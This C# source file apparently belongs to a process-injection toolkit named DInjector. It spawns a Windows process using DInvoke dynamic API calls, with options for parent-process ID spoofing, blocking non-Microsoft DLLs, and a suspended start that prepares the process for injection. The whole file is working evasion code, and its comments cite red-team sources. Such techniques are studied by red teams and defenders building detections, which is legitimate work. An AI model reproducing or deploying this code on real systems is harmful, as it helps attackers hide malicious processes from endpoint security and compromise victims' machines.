using System;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    /// <summary>
    /// Based on:
    /// https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/
    /// https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Utilities.cs
    /// </summary>
    class SpawnProcess
    {
        public static bool Is64Bit => IntPtr.Size == 8;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DeleteProcThreadAttributeList(
            IntPtr lpAttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            ref DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES lpProcessAttributes,
            ref DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX lpStartupInfoEx,
            out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

        private static bool initializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, ref IntPtr lpSize)
        {
            object[] parameters = { lpAttributeList, dwAttributeCount, 0, lpSize };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "InitializeProcThreadAttributeList", typeof(InitializeProcThreadAttributeList), ref parameters);

            lpSize = (IntPtr)parameters[3];
            return result;
        }

        private static bool updateProcThreadAttribute(IntPtr lpAttributeList, IntPtr attribute, IntPtr lpValue)
        {
            object[] parameters = { lpAttributeList, (uint)0, attribute, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(UpdateProcThreadAttribute), ref parameters, true);

            return result;
        }

        private static bool deleteProcThreadAttributeList(IntPtr lpAttributeList)
        {
            object[] parameters = { lpAttributeList };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "DeleteProcThreadAttributeList", typeof(DeleteProcThreadAttributeList), ref parameters);

            return result;
        }

        private static bool createProcessA(string applicationName, string workingDirectory, uint creationFlags, DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX startupInfoEx, out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation)
        {
            var pa = new DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES();
            var ta = new DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES();
            var pi = new DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();

            object[] parameters = { applicationName, null, pa, ta, false, creationFlags, IntPtr.Zero, workingDirectory, startupInfoEx, pi };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CreateProcessA", typeof(CreateProcessA), ref parameters);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            processInformation = (DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION)parameters[9];

            return result;
        }

        public static DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION Execute(string processImage, string workingDirectory, bool suspended, int ppid, bool blockDlls)
        {
            var startupInfoEx = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
            startupInfoEx.StartupInfo.dwFlags = (uint)DI.Data.Win32.Kernel32.STARTF.STARTF_USESHOWWINDOW;

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            var lpSize = IntPtr.Zero;

            var attributeCount = 0;
            if (ppid != 0) attributeCount++;
            if (blockDlls) attributeCount++;

            // Should be false the first time, lpSize is given a value
            _ = initializeProcThreadAttributeList(
                IntPtr.Zero,
                attributeCount,
                ref lpSize);

            startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

            // Should be true now
            var result = initializeProcThreadAttributeList(
                startupInfoEx.lpAttributeList,
                attributeCount,
                ref lpSize);

            if (result)
                Console.WriteLine("(SpawnProcess) [+] InitializeProcThreadAttributeList");
            else
                throw new Exception("(SpawnProcess) [-] InitializeProcThreadAttributeList");

            if (blockDlls)
            {
                Marshal.WriteIntPtr(lpValue,
                    Is64Bit ?
                        new IntPtr(DI.Data.Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
                        : new IntPtr(unchecked((uint)DI.Data.Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)));

                result = updateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (IntPtr)DI.Data.Win32.Kernel32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                    lpValue);

                if (result)
                    Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (blockDLLs)");
                else
                    throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (blockDLLs)");
            }

            if (ppid != 0)
            {
                var hParent = Process.GetProcessById(ppid).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hParent);

                result = updateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    (IntPtr)DI.Data.Win32.Kernel32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue);

                if (result)
                    Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (PPID)");
                else
                    throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (PPID)");
            }

            var flags = DI.Data.Win32.Kernel32.EXTENDED_STARTUPINFO_PRESENT;
            if (suspended) flags |= (uint)DI.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED;

            result = createProcessA(
                processImage,
                workingDirectory,
                flags,
                startupInfoEx,
                out var pi);

            if (result)
                Console.WriteLine("(SpawnProcess) [+] CreateProcessA");
            else
                Console.WriteLine("(SpawnProcess) [-] CreateProcessA");

            _ = deleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
            Marshal.FreeHGlobal(lpValue);

            return pi;
        }
    }
}
